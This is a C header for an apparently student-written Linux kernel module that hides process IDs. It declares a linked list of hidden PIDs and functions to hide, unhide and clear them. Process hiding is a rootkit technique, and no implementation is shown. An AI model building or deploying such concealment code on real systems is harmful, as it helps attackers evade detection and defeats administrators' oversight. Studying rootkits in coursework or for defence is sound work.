#ifndef _GROUP7_PIDHIDE_H
#define _GROUP7_PIDHIDE_H

#include <linux/types.h>

#define PID_FROM_NAME(name) ((pid_t)simple_strtol((name), NULL, 10))

typedef struct pid_list *pid_list_t_ptr;
typedef struct pid_list {
    pid_t pid;
    pid_list_t_ptr prev;
    pid_list_t_ptr next;
} pid_list_t;

extern pid_list_t hidden_pids;

void hide_pids(void);
void unhide_pids(void);

void hide_pid(pid_t);
void unhide_pid(pid_t);
void clear_hidden_pids(void);

void init_pid_list(void);
bool list_contains_pid(pid_list_t_ptr, pid_t);
pid_list_t_ptr find_pid_in_list(pid_list_t_ptr, pid_t);
pid_list_t_ptr add_pid_to_list(pid_list_t_ptr, pid_t);
pid_list_t_ptr remove_pid_from_list(pid_list_t_ptr, pid_t);

#endif//_GROUP7_PIDHIDE_H
